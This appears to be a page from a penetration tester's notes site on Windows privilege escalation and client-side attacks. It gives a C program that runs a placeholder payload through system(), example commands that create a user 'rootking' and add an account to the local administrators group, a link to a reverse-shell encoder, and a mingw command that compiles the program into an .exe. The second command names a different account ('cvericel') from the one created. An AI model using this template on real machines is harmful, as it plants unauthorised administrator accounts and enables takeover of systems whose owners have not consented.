---
title: Target reconnaissance
description: Inspect client foothold in order to perform Client side attacks
tags:
  - Exploitation
  - Windows
  - Privilege Escalation
---

## Generating executable from C++

```cpp 
#include <stdlib.h>

int main ()
{
  int i;
  
	// PAYLOAD EXAMPLE
	// ADD USER : "net user rootking password123! /add" / "net localgroup administrators cvericel /add"
	// REV SHELL : Use /opt/psh-encode-revshell.py
  i = system ("PAYLOAD");
  
  return 0;
}
```

## Payload example

+++ Create new admin user

```
"net user rootking password123! /add" / "net localgroup administrators cvericel /add"
```

+++ Reverse shell

[!ref icon=":rocket:"](encode-pwsh-rev-shell.md)


+++

## Cross-Compile the C Code to a 64-bit application

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```